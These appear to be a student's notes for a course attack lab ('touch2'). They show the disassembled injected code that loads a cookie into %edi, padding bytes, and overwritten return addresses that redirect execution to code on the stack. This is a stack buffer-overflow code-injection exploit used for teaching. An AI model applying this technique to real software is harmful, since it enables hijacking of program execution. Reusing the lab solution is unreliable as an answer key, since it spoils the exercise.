
touch2.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	b8 e4 44 60 00       	mov    $0x6044e4,%eax
   5:	8b 38                	mov    (%rax),%edi
   7:	c3                   	retq

buf
0x5561dc78: 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 
0x5561dca0: 0x000000005561dcb0 in reversed order -- address  ret instruction jumps to parameter preparation
0x5561dca8: 0x00000000004017ec in reversed order -- address  ret transfers control to function <touch2>

# moving cookie to %rdi (parameter preparation)
0x5561dcb0: b8e4446000
0x5561dcb5: 8b38c3
